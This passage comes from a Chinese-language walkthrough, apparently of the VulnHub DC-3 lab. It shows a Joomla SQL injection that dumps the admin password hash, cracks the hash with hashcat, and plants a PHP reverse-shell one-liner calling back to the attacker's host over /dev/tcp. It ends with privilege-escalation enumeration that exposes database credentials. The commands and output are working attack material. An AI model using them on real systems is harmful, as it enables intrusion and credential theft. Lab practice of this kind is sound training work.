class="hljs-comment">#__categories       |</span><br>| <span class="hljs-comment">#__contact_details  |</span><br>| <span class="hljs-comment">#__content_frontpag |</span><br>| <span class="hljs-comment">#__content_rating   |</span><br>| <span class="hljs-comment">#__content_types    |</span><br>| <span class="hljs-comment">#__content          |</span><br>| <span class="hljs-comment">#__contentitem_tag_ |</span><br>| <span class="hljs-comment">#__core_log_searche |</span><br>| <span class="hljs-comment">#__extensions       |</span><br>| <span class="hljs-comment">#__fields_categorie |</span><br>| <span class="hljs-comment">#__fields_groups    |</span><br>| <span class="hljs-comment">#__fields_values    |</span><br>| <span class="hljs-comment">#__fields           |</span><br>| <span class="hljs-comment">#__finder_filters   |</span><br>| <span class="hljs-comment">#__finder_links_ter |</span><br>| <span class="hljs-comment">#__finder_links     |</span><br>| <span class="hljs-comment">#__finder_taxonomy_ |</span><br>| <span class="hljs-comment">#__finder_taxonomy  |</span><br>| <span class="hljs-comment">#__finder_terms_com |</span><br>| <span class="hljs-comment">#__finder_terms     |</span><br>| <span class="hljs-comment">#__finder_tokens_ag |</span><br>| <span class="hljs-comment">#__finder_tokens    |</span><br>| <span class="hljs-comment">#__finder_types     |</span><br>| <span class="hljs-comment">#__jbsbackup_timese |</span><br>| <span class="hljs-comment">#__jbspodcast_times |</span><br>| <span class="hljs-comment">#__languages        |</span><br>| <span class="hljs-comment">#__menu_types       |</span><br>| <span class="hljs-comment">#__menu             |</span><br>| <span class="hljs-comment">#__messages_cfg     |</span><br>| <span class="hljs-comment">#__messages         |</span><br>| <span class="hljs-comment">#__modules_menu     |</span><br>| <span class="hljs-comment">#__modules          |</span><br>| <span class="hljs-comment">#__newsfeeds        |</span><br>| <span class="hljs-comment">#__overrider        |</span><br>| <span class="hljs-comment">#__postinstall_mess |</span><br>| <span class="hljs-comment">#__redirect_links   |</span><br>| <span class="hljs-comment">#__schemas          |</span><br>| <span class="hljs-comment">#__session          |</span><br>| <span class="hljs-comment">#__tags             |</span><br>| <span class="hljs-comment">#__template_styles  |</span><br>| <span class="hljs-comment">#__ucm_base         |</span><br>| <span class="hljs-comment">#__ucm_content      |</span><br>| <span class="hljs-comment">#__ucm_history      |</span><br>| <span class="hljs-comment">#__update_sites_ext |</span><br>| <span class="hljs-comment">#__update_sites     |</span><br>| <span class="hljs-comment">#__updates          |</span><br>| <span class="hljs-comment">#__user_keys        |</span><br>| <span class="hljs-comment">#__user_notes       |</span><br>| <span class="hljs-comment">#__user_profiles    |</span><br>| <span class="hljs-comment">#__user_usergroup_m |</span><br>| <span class="hljs-comment">#__usergroups       |</span><br>| <span class="hljs-comment">#__users            |</span><br>| <span class="hljs-comment">#__utf8_conversion  |</span><br>| <span class="hljs-comment">#__viewlevels       |</span><br>+---------------------+<br><br>[15:10:47] [WARNING] HTTP error codes detected during run:<br>500 (Internal Server Error) - 93 <span class="hljs-built_in">times</span><br>[15:10:47] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span>                                                                               <br><br>[*] ending @ 15:10:47 /2023-05-31/<br></code></pre></td></tr></table></figure>

<p>我们可以发现可以把joomladb中的表给查出来。</p>
<p>但是如果此时你开开心心的想着去查<code>#__users</code>表中的列名你就会发现，根本查不出来。为什么呢？原因在于joomla配置文件里可以设置数据库中表名前面带有一个固定的前缀，所以实际上表名应该是<code>Setprefix_users</code>，然而我们看不到配置文件，显然猜不出来管理员到底设置了什么前缀。所以这条路只能作罢。</p>
<h3 id="Joomblah"><a href="#Joomblah" class="headerlink" title="Joomblah"></a>Joomblah</h3><p>其实joomla有专门的漏洞利用脚本：<a target="_blank" rel="noopener" href="https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py">joomblah</a> 我们可以直接用这个脚本来对joomla进行利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ python3 joomblah.py http://192.168.56.111 <br>                                                                                                                                                                                          <br>    .---.    .-<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.        .-&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>-.                                         <br>    |   |   <span class="hljs-string">&#x27;   _    \     &#x27;</span>   _    \                            .---.       <br>    <span class="hljs-string">&#x27;---&#x27;</span> /   /` <span class="hljs-string">&#x27;.   \  /   /` &#x27;</span>.   \  __  __   ___   /|        |   |            .                                                                       <br>    .---..   |     \  <span class="hljs-string">&#x27; .   |     \  &#x27;</span> |  |/  `.<span class="hljs-string">&#x27;   `. ||        |   |          .&#x27;</span>|                                                                       <br>    |   ||   <span class="hljs-string">&#x27;      |  &#x27;</span>|   <span class="hljs-string">&#x27;      |  &#x27;</span>|   .-.  .-.   <span class="hljs-string">&#x27;||        |   |         &lt;  |                                                                       </span><br><span class="hljs-string">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |                                                                       </span><br><span class="hljs-string">    |   | `.   ` ..&#x27;</span> /   `.   ` ..<span class="hljs-string">&#x27; /  |  |  |  |  |  |||/&#x27;</span>__ <span class="hljs-string">&#x27;. |   | .:--.&#x27;</span>.  | | .<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;-.                                                             </span><br><span class="hljs-string">    |   |    &#x27;</span>-...-<span class="hljs-string">&#x27;`       &#x27;</span>-...-<span class="hljs-string">&#x27;`   |  |  |  |  |  ||:/`  &#x27;</span>. <span class="hljs-string">&#x27;|   |/ |   \ | | |/.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>. \                                                             <br>    |   |                              |  |  |  |  |  |||     | ||   |`<span class="hljs-string">&quot; __ | | |  /    | |                                                             </span><br><span class="hljs-string">    |   |                              |__|  |__|  |__|||\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |                                                         </span><br><span class="hljs-string"> __.&#x27;   &#x27;                                              |/&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   </span><br><span class="hljs-string">|      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \ \._,\ &#x27;/| &#x27;.    | &#x27;.                                                         </span><br><span class="hljs-string">|____.&#x27;                                                                `--&#x27;  `&quot;</span> <span class="hljs-string">&#x27;---&#x27;</span>   <span class="hljs-string">&#x27;---&#x27;</span>                                                                                             <br><br> [-] Fetching CSRF token<br> [-] Testing SQLi<br>  -  Found table: d8uea_users<br>  -  Found table: <span class="hljs-built_in">users</span><br>  -  Extracting <span class="hljs-built_in">users</span> from d8uea_users<br> [$] Found user [<span class="hljs-string">&#x27;629&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span>, <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br>  -  Extracting sessions from d8uea_session<br>  -  Extracting <span class="hljs-built_in">users</span> from <span class="hljs-built_in">users</span><br>  -  Extracting sessions from session<br>                                     <br></code></pre></td></tr></table></figure>

<p>从这里我们可以发现原来管理员将前缀设置为d8uea了。当然，最重要的是我们拿到了admin用户的密码哈希<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
<h3 id="破解哈希值"><a href="#破解哈希值" class="headerlink" title="破解哈希值"></a>破解哈希值</h3><p>$2开头的多半是bcrypt。丢到在线破解网站上尝试没有破解出来。那就本地试试吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ hashcat -O -a 0 -m 3200 <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> /usr/share/wordlists/rockyou.txt<br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCU</span><br><br>Kernel /usr/share/hashcat/OpenCL/m03200-optimized.cl:<br>Optimized kernel requested, but not available or not required<br>Falling back to pure kernel<br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 72<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 0 MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344385<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br><br>$2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span>:snoopy<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 3200 (bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix))<br>Hash.Target......: $2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0</span>...lfB1Zu<br>Time.Started.....: Wed May 31 15:35:40 2023 (3 secs)<br>Time.Estimated...: Wed May 31 15:35:43 2023 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:       85 H/s (7.63ms) @ Accel:8 Loops:16 Thr:1 Vec:1</span><br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 192/14344385 (0.00%)<br>Rejected.........: 0/192 (0.00%)<br>Restore.Point....: 128/14344385 (0.00%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: carolina -&gt; november</span><br>Hardware.Mon.<span class="hljs-comment">#1..: Util: 87%</span><br><br>Started: Wed May 31 15:34:50 2023<br>Stopped: Wed May 31 15:35:45 2023<br></code></pre></td></tr></table></figure>

<p>解释一下<code>hashcat</code>里的一些参数：<code>-O</code>表示使用Optimized kernel（这台机子实际上不支持），<code> -a 0</code>代表使用字典攻击，<code> -m 3200</code>代表哈希类型是bcrypt(3200)。</p>
<p>发现秒破解出来登录凭证:<code>admin:snoopy</code></p>
<p>成功登录后台。（后台地址之前扫描就扫出来了：<a target="_blank" rel="noopener" href="http://192.168.56.111/administrator/%EF%BC%89">http://192.168.56.111/administrator/）</a></p>
<p class='item-img' data-src='/pic/assets/joomla-backend.png'><img src="/pic/assets/joomla-backend.png" alt="joomla-backend"></p>
<h3 id="后台get-shell"><a href="#后台get-shell" class="headerlink" title="后台get shell"></a>后台get shell</h3><p>如果对joomla这套CMS比较熟的话可以直奔顶栏Extensions导航到templates</p>
<p class='item-img' data-src='/pic/assets/target.png'><img src="/pic/assets/target.png" alt="target"></p>
<p>然后我们直接选择当前使用的模版protostar</p>
<p class='item-img' data-src='/pic/assets/template-template-page.png'><img src="/pic/assets/template-template-page.png" alt="template-template-page"></p>
<p>向error.php页面写入我们的反弹shell。（向404页面写入的好处在于不用精确定位写入页面在哪，瞎输一个不存在的页面就行）</p>
<p class='item-img' data-src='/pic/assets/editting-errorpage.png'><img src="/pic/assets/editting-errorpage.png" alt="editting-errorpage"></p>
<p>简简单单插个一句话<code>&lt;?php system(&quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.144/443 0&gt;&amp;1&#39;&quot;); ?&gt;</code></p>
<p>成功拿shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo nc -lvp 443                      <br>listening on [any] 443 ...<br>192.168.56.111: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.144] from (UNKNOWN) [192.168.56.111] 33186<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1183): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@DC-3:/var/www/html$ <br></code></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/var/www/html$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux DC-3 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span><br></code></pre></td></tr></table></figure>

<p>如果比较有经验的话可以看出4.4.0-21-generic版本一般是存在可利用内核漏洞的，当然不知道可以直接<code>searchsploit Linux kenerls 4.4</code>查一下。但是显然提权第一选择不是内核漏洞，先看看别的吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/var/www/html$ sudo -l<br>sudo -l<br>sudo: no <span class="hljs-built_in">tty</span> present and no askpass program specified<br>www-data@DC-3:/var/www/html$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>www-data@DC-3:/var/www/html$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@DC-3:/var/www/html$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: www-data<br><br>Sorry, try again.<br><br>www-data@DC-3:/home/dc3$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/bin/ping6<br>/bin/ntfs-3g<br>/bin/umount<br>/bin/su<br>/bin/fusermount<br>/bin/mount<br>/bin/ping<br>/usr/lib/snapd/snap-confine<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/i386-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/passwd<br>/usr/bin/newgidmap<br>/usr/bin/gpasswd<br>/usr/bin/sudo<br>/usr/bin/pkexec<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newuidmap<br>/usr/bin/newgrp<br>/usr/bin/at<br>www-data@DC-3:/home/dc3$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>sudo，suid和cron三件套没有值得注意的地方，当然cron没有详细列举具体cron脚本啥的。但是感觉不是很理想，先看看别的吧。</p>
<p>再看看网页的配置文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/var/www/html$ <span class="hljs-built_in">cat</span> configuration.php<br><span class="hljs-built_in">cat</span> configuration.php<br>&lt;?php<br>class JConfig &#123;<br>        public <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        public <span class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        public <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        public <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        public <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        public <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;squires&#x27;</span>;<br>        public <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomladb&#x27;</span>;<br>        public <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;d8uea_&#x27;</span>;<br>        public <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;7M6S1HqGMvt1JYkY&#x27;</span>;<br>        public <span class="hljs-variable">$gzip</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$error_reporting</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br>        public <span class="hljs-variable">$helpurl</span> = <span class="hljs-string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_port</span> = <span class="hljs-string">&#x27;21&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_user</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_pass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_root</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_enable</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offset</span> = <span class="hljs-string">&#x27;UTC&#x27;</span>;<br>        public <span class="hljs-variable">$mailonline</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$mailer</span> = <span class="hljs-string">&#x27;mail&#x27;</span>;<br>        public <span class="hljs-variable">$mailfrom</span> = <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span>;<br>        public <span class="hljs-variable">$fromname</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$sendmail</span> = <span class="hljs-string">&#x27;/usr/sbin/sendmail&#x27;</span>;<br>        public <span class="hljs-variable">$smtpauth</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$smtpuser</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtppass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtphost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$smtpsecure</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$smtpport</span> = <span class="hljs-string">&#x27;25&#x27;</span>;<br>        public <span class="hljs-variable">$caching</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$cache_handler</span> = <span class="hljs-string">&#x27;file&#x27;</span>;<br>        public <span class="hljs-variable">$cachetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$cache_platformprefix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$MetaDesc</span> = <span class="hljs-string">&#x27;A website for DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$MetaKeys</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$MetaTitle</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaAuthor</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaVersion</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$robots</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sef</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$sef_rewrite</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$sef_suffix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$unicodeslugs</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$feed_limit</span> = <span class="hljs-string">&#x27;10&#x27;</span>;<br>        public <span class="hljs-variable">$feed_email</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$log_path</span> = <span class="hljs-string">&#x27;/var/www/html/administrator/logs&#x27;</span>;<br>        public <span class="hljs-variable">$tmp_path</span> = <span class="hljs-string">&#x27;/var/www/html/tmp&#x27;</span>;<br>        public <span class="hljs-variable">$lifetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$session_handler</span> = <span class="hljs-string">&#x27;database&#x27;</span>;<br>        public <span class="hljs-variable">$shared_session</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现数据库root用户的密码squires。先试试有没有大聪明密码复用（su），可惜都没有。再看看数据库是不是以root权限运行（ps aux | grep mysql），发现也不是。</p>
<p>登陆数据库看看有无信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 